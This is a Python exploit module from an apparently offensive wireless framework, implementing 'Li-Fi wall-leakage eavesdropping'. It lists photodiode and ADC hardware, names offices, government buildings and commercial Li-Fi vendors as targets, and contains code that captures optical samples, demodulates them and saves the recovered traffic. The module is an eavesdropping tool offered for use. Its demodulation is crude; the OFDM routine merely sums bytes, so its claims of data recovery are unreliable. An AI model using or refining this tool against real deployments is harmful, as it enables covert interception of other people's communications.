# Author: André Henrique (LinkedIn/X: @mrhenrike)
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Li-Fi Wall-Leakage Eavesdropping.

    Li-Fi (Light Fidelity, IEEE 802.11bb) uses modulated visible
    light or infrared for data transmission.  Although marketed as
    inherently secure due to line-of-sight limitation, Li-Fi signals
    leak through gaps around doors, windows, translucent materials,
    and reflections from walls and ceilings.

    An attacker positions a high-sensitivity photodiode near these
    leakage points to capture the modulated light signal and
    demodulate the data stream.

    Hardware requirements:
    - Photodiode: BPW34 (visible) or SFH2701 (broadband, recommended)
    - Transimpedance amplifier (TIA): e.g., OPA380 or MAX4206
    - USB ADC: at least 10 MS/s for OOK, 50+ MS/s for OFDM Li-Fi
      (e.g., Analog Discovery 2, PicoScope, or USB oscilloscope)
    - Optional: optical bandpass filter matching Li-Fi wavelength
    - Laptop for signal processing (Python + NumPy/SciPy)

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Li-Fi Wall-Leakage Eavesdropping",
        "description": (
            "Captures Li-Fi (IEEE 802.11bb) data by exploiting light "
            "leakage through door gaps, windows, and reflective "
            "surfaces.  Requires photodiode (BPW34 or SFH2701) with "
            "transimpedance amplifier and USB ADC (10+ MS/s for OOK, "
            "50+ MS/s for OFDM).  Demodulates captured optical "
            "signal to recover transmitted data frames."
        ),
        "authors": (
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://ieeexplore.ieee.org/document/9755267",
            "https://standards.ieee.org/ieee/802.11bb/10823/",
        ),
        "disclosure_date": "2023-06-01",
        "platform": "linux",
        "arch": "all",
        "privileged": False,
        "targets": (
            "Li-Fi deployments in offices, government buildings",
            "IEEE 802.11bb OOK and OFDM Li-Fi systems",
            "pureLiFi, Signify, Oledcomm commercial systems",
        ),
    }

    target = OptIP("", "Target description or location identifier")
    port = OptPort(1, "Not used (optical capture)")
    timeout = OptFloat(30.0, "Capture duration in seconds")
    adc_device = OptString("/dev/ttyUSB0", "USB ADC serial device or 'simulate'")
    sample_rate = OptInteger(10000000, "ADC sample rate in samples/sec")
    modulation = OptString("ook", "Li-Fi modulation: ook, ofdm, vppm")
    wavelength = OptInteger(450, "Li-Fi LED wavelength in nm (blue=450, white=0)")
    output_file = OptString("/tmp/lifi_capture.raw", "Output file for captured samples")

    _OOK_THRESHOLD = 0.5
    _OFDM_SUBCARRIERS = 64
    _MIN_SAMPLES = 1000

    def _simulate_capture(self, duration: float) -> bytes:
        """Generate simulated photodiode capture for testing."""
        num_samples = int(float(self.sample_rate) * duration)
        num_samples = min(num_samples, 1000000)
        data = bytearray()
        for i in range(num_samples):
            if (i // 100) % 2 == 0:
                sample = 200 + (i % 30)
            else:
                sample = 40 + (i % 20)
            data.append(sample & 0xFF)
        return bytes(data)

    def _demodulate_ook(self, samples: bytes) -> bytes:
        """Demodulate OOK (On-Off Keying) from photodiode samples."""
        bits = []
        for s in samples:
            bits.append(1 if s > int(255 * self._OOK_THRESHOLD) else 0)

        data_bytes = bytearray()
        for i in range(0, len(bits) - 7, 8):
            byte_val = 0
            for j in range(8):
                byte_val = (byte_val << 1) | bits[i + j]
            data_bytes.append(byte_val)
        return bytes(data_bytes)

    def _demodulate_ofdm(self, samples: bytes) -> bytes:
        """Demodulate OFDM Li-Fi signal (simplified)."""
        symbols = []
        symbol_len = self._OFDM_SUBCARRIERS * 2
        for i in range(0, len(samples) - symbol_len, symbol_len):
            symbol = samples[i:i + symbol_len]
            symbols.append(symbol)

        data = bytearray()
        for sym in symbols[:100]:
            data.append(sum(sym) % 256)
        return bytes(data)

    @mute
    def check(self) -> bool:
        """Verify ADC device or simulation mode."""
        if str(self.adc_device) == "simulate":
            return True
        try:
            with open(str(self.adc_device), "rb"):
                return True
        except OSError:
            return False

    def run(self) -> None:
        print_success(
            f"Li-Fi wall-leakage eavesdrop "
            f"(modulation: {self.modulation}, "
            f"sample rate: {self.sample_rate} S/s, "
            f"duration: {self.timeout}s)"
        )
        self._exploit()

    def _exploit(self) -> None:
        print_status("Capturing optical signal from photodiode")

        if str(self.adc_device) == "simulate":
            samples = self._simulate_capture(float(self.timeout))
        else:
            try:
                with open(str(self.adc_device), "rb") as f:
                    num_bytes = int(float(self.sample_rate) * float(self.timeout))
                    samples = f.read(num_bytes)
            except OSError:
                print_error(f"Cannot read from ADC device {self.adc_device}")
                return

        print_info(f"Captured {len(samples)} samples")

        if len(samples) < self._MIN_SAMPLES:
            print_error("Insufficient samples captured. Check photodiode and ADC.")
            return

        mod = str(self.modulation).lower()
        if mod == "ook":
            decoded = self._demodulate_ook(samples)
        elif mod == "ofdm":
            decoded = self._demodulate_ofdm(samples)
        else:
            decoded = self._demodulate_ook(samples)

        print_info(f"Demodulated {len(decoded)} bytes of Li-Fi data")

        if decoded:
            try:
                with open(str(self.output_file), "wb") as f:
                    f.write(decoded)
            except OSError:
                pass

            print_success(
                f"Li-Fi traffic captured via wall leakage: "
                f"{len(decoded)} bytes recovered. "
                f"Saved to {self.output_file}"
            )
